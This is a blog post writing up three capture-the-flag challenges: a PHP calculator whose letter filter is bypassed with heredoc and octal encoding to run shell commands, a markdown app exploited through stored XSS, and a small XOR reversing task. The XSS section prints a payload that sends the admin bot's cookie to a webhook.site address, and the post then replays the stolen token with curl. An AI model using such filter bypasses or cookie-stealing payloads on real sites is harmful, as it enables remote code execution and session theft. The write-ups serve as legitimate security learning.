---
layout: post
title: "The Summer of Challs: Week 3"
date: 2024-06-02
categories: CTFs
---

This week I tried out a couple of challenges from L3akCTF and AngstromCTF. While they were mostly web again, I tried my first rev as well. Overall, most of the challenges felt slightly more advanced in terms of difficulty. 

## SIMPLE CALCULATOR - L3AKCTF (WEB)

The challenge tells us to unveil "PHP secrets". We are taken to a blank screen that just shows the text "Result:". 

![SimpleCalc](/assets/SimpleCalculatorBlank.jpg)

After playing with the web app and skimming the source code, I figured out that I could make requests like this: `https://challenge_url/?formula=7*7`, and `Result: 49` would be displayed on the page. 

This immediately led me to think of some sort of Remote Code Execution (RCE) vulnerability through bypassing some PHP technicalities/fiters, given the challenge hint. However, it is quite difficult to input any statement through the `formula` query string. The source code contains a regex filter that doesn't allow any letters to be passed in, and it also blocks the single (') and double (") quote characters.

Within the source code files lies a flag.txt file. The name of the file is created through some hashing which is impossible to guess. We clearly need to put some code in the query string that the server will then execute to see the available files in the working directory to see what the flag file is called - from there, we can simply access it with a get request: `https://challenge_url/name_of_flag_file`.

We can do this with some special PHP syntax, as well as encoding letters into octal numbering. The specific code I decided to execute was 

```PHP
shell_exec('ls')
```

It will be difficult to work with both the parenthesis here as well as the single quotes, so we can take advantage of the fact that php functions can both be executed in the form of `shell_exec('ls')` OR `("shell_exec")("ls")`. We can combine this with [heredoc syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc) to form our payload. 

Heredoc essentialy allows to express double quotes with the characters "<<<", some header character (I chose _), and some newlines. I then formed this:
(<<<_
 shell_exec)
 _
 (<<<_
 ls)
 _

Of course, strings are not allowed, but in PHP, we can encode them by using the escape character and converting them into octal values. `shell_exec` converts to `/163/150/145/154/154/137/145/170/145/143`, and `ls` converts to `/154/163`. To make a valid get request, I url encoded the converted numbers and got this final payload: `http://45.129.40.107:9668/?formula=(%3C%3C%3C_%0A%5C163%5C150%5C145%5C154%5C154%5C137%5C145%5C170%5C145%5C143%0A_)(%3C%3C%3C_%0A%5C154%5C163%0A_)`

The code successfully executed and I saw this: 

![SimpleCalculator](/assets/SimpleCalculatorFlagName.jpg)

From here, we can visit this endpoint: `http://45.129.40.107:9668/flag-eucmCjFHC1oimI0d9XxT7JzANCVOhrFX2OVdy8NxGQ3aPxDLd4WwwQ82eMKlRZBy.txt` since we know the name of the flag file, and the flag is displayed:

[SimpleCalculator](/assets/SimpleCalculatorFlag.jpg)

This was a nice challenge. It reminds me of a lot of other PHP challenges I've done, which seem to have a common theme of filter bypass through some syntax trickery. Once in a while, it's fun to do these. 

## MARKDOWN - ANGSTROMCTF (WEB)

There is both a normal webapp, as well as an "admin bot" provided with this challenge. The app itself just shows this: 

![Markdown](/assets/MarkdownApp.jpg)

We can essentially write some text in the box, hit create, and view our text rendered within the web app. This immediately made me think I was dealing with Cross Site Scripting (XSS), due to the fact that I can provide user input that the "admin bot" can visit. The source code gives some hints on how to get the flag:

```javascript
app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
        ? process.env.FLAG
        : 'no flag for you'
    )
})
```

The token that the app is checking for if we go to the flag endpoint can only belong to none other than the admin bot, within the context of this challenge. So how can we get the admin bot's cookie, which supposedly contains this token?

I tried a couple of different XSS payloads until this one finally worked: `<img src=x onerror="alert('XSS')">`. When I entered this into the text box and hit create, the browser itself executed this javascript code, client side, and caused an alert to popup on my screen:

![Markdown](/assets/MarkDownXSSProof.jpg)

Due to the application not properly sanitizing input, we are able to take advantage of the browser and allow it to do what we want. This includes making the browser send a cookie to another webserver...

The admin bot provided takes a url as input and visits it. By modifying the XSS payload to force the brwoser to fetch `document.cookie` and send it to a webhook that I set up, I was able to get the token. 

I made a post with this specific text content: 

```javascript
<img src=x onerror="fetch('https://webhook.site/410fec2e-da06-4914-96be-866915b53dc5' + '?' + document.cookie)">
```

This actually made my browser send my cookie to the webhook I set up, which proved the XSS worked. From here, I simply provided the link to the admin bot, and it visited the note. As soon as it did, the admin's browser sent its cookie to my webhook.

![Markdown](/assets/MarkDownXSSProof.jpg)

This is very cool because we are not necessarily getting the server to send us resources through misconfiguration (like what we saw in a couple of last weeks challenges), and we aren't executing code in the backend to gain information or get access to files. By simply providing input that isn't sanitized, the front end is what executes our code, making XSS a very unique and powerful vulnerability. 

Anyways, with the token, I made this cURL request: `curl https://markdown.web.actf.co/flag -H 'cookie: token=d15453b0234690ccbb91861e'`
and got the flag: `actf{b534186fa8b28780b1fcd1e95e2a2e2c}`.

This is the first XSS challenge of the blog, and I am still very inexperience with it. That being said, it is a quite expansive vulnerability and one of the most common. I hope to do more of these that cover harder concepts like CSP bypasses or even client side template injections.

## GUESS THE FLAG - ANGSTROMCTF (REV)

The first rev of the blog! All we are provided with is a "ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5872c12702d2954fef870af77944910ef66b5d69, for GNU/Linux 3.2.0, not stripped". It's an executable file. Upon running it, you are prompted with a password. Of course, it is impossible to know what the password is, so if you attempt to guess it, you are just given a message saying you are wrong, and the program ends. 

Due to the simplicity of this, I assume that entering the correct password either gives us the flag, or the password IS the flag itself. Without any other information, we have to decompile this thing. My decompiler (and analyzer) of choice is Ghidra. 

After decompiling it, I was able to view the main method: 

```C
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  byte *pbVar3;
  long in_FS_OFFSET;
  byte local_68 [72];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Go ahead, guess the flag: ");
  fgets((char *)local_68,0x3f,stdin);
  pbVar3 = local_68;
  while( true ) {
    sVar2 = strlen((char *)local_68);
    if (sVar2 <= (ulong)((long)pbVar3 - (long)local_68)) break;
    *pbVar3 = *pbVar3 ^ 1;
    pbVar3 = pbVar3 + 1;
  }
  iVar1 = strcmp((char *)local_68,(char *)&secretcode);
  if (iVar1 == 0) {
    puts("Correct! It was kinda obvious tbh.");
  }
  else {
    puts("Wrong. Not sure why you\'d think it\'d be that.");
  }
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
The code is taking what we input (this gets stored in the pointer `pbVar3`), XORs each digit by 1 (`*pbVar3 = *pbVar3 ^ 1;`), and compares it to the variable `secretcode` (`iVar1 = strcmp((char *)local_68,(char *)&secretcode);`). If they are the same, we get a correct message. 

I found the memory address of the secretcode string to be 00104020. I went to this address and saw the bytes of the string in hexadecimal: 

![GuessTheFlag](/assets/GuessTheFlagSC.jpg)

A byte is stored at each memory address until the address 0010404c, where the byte 00 is stored (this is simply the null terminator of the secretcode string). 

At this point, it might seem like it is necessary to simply gather these hexadecimal values and convert them into ASCII to form a string that would be the flag. However, this doesn't work, because our input is XORd and THEN compared with the secret code. We want to see what the secretcode is BEFORE XORing so we can enter the right input. 

To do this, I wrote this simple python script where I take each byte of the secret code and XOR it with 1 again to get the original string: 

```python
secretCode = bytes.fromhex("606275677a626e6c6c68757564655e756e5e7569645e6d646072755e7268666f68676862606f755e6368757c00")
decoded = []
for byte in secretCode:
    decoded.append(chr(byte ^ 1))

flag = ''.join(decoded)
print(flag)
```

Upon running the script, we get the flag: `actf{committed_to_the_least_significant_bit}`.

I liked this introduction to rev. Obviously it gets much, much harder than this, but this is quite a cool start. 

There were definitely some great challenges this week - Angstrom is a consistently great competition, and L3ak was quite interesting as well. Next week will probably be quite similar in that I will focus mostly on web, while trying out a rev challenge or two. 